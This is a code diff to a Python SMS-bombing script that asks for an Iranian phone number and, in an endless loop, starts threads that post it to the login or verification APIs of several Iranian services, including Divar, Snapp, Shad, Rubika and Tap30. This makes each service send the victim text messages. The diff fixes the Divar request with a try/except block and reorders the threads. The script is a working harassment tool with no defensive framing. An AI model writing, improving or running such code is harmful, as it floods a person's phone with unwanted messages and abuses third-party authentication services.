@@ -31,12 +31,15 @@ def divar(phone):
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
     "Accept-Language":"en-US,en;q=0.5"}
     data = {"cellphone":"phone"}
-    if "OK" in divarR.text:
+    try:
+        divarR = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=divarh , data=data , proxies=proxy)
+        if "OK" in divarR.text:
             print ("sended sms:)")
         else:
             print ("Error!")
     except:
         print ("Error!")
+
     
 def shad(phone):
     #shad api
@@ -129,11 +132,11 @@ def main():
     phone = str(input("Made by baji inter phone number (+98xxxxxxx): "))
     while True:
         Thread(target=snap, args=[phone]).start()
-        Thread(target=divar, args=[phone]).start()
+        Thread(target=shad, args=[phone]).start()
         Thread(target=gap, args=[phone]).start()
         Thread(target=tap30, args=[phone]).start()
         Thread(target=emtiaz, args=[phone]).start()
-        Thread(target=shad, args=[phone]).start()
+        Thread(target=divar, args=[phone]).start()
         Thread(target=rubika, args=[phone]).start()
         Thread(target=torob, args=[phone]).start()
         Thread(target=bama, args=[phone]).start()
